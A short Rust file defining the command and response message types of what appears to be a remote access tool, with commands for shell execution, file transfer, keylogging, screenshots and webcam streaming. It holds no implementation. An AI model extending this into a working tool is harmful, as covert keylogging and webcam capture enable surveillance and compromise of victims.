use serde::{Deserialize, Serialize};

#[derive(Serialize, Deserialize, Debug, Clone)]
pub enum Command {
    Shell(String),
    Download(String),
    Upload { filename: String, data: Vec<u8> },
    Keylog,
    Screenshot,
    Webcam,
    WebcamStream,
    Exit,
}

#[derive(Serialize, Deserialize, Debug)]
pub enum Response {
    Success(String),
    Data { data: Vec<u8>, kind: String },
    Error(String),
}